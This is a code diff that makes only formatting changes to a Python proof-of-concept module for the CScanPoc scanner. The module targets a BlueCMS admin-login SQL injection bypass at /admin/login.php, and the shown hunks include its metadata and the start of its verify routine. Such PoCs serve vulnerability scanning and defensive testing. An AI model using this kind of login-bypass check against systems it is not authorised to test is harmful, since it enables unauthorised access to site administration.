@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'BlueCMS_0002' # 平台漏洞编号，留空
+    vuln_id = 'BlueCMS_0002'  # 平台漏洞编号，留空
     name = 'BlueCMS 双字节万能密码进后台'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-04-01'  # 漏洞公布时间
     desc = '''
         BlueCMS /admin/login.php 双字节万能密码进后台：
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'BlueCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '6bde6438-c512-4e18-a7d1-eb381e56675a'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-021082
+
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-021082
             hh = hackhttp.hackhttp()
             payload = "/admin/login.php"
             target = self.target + payload
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
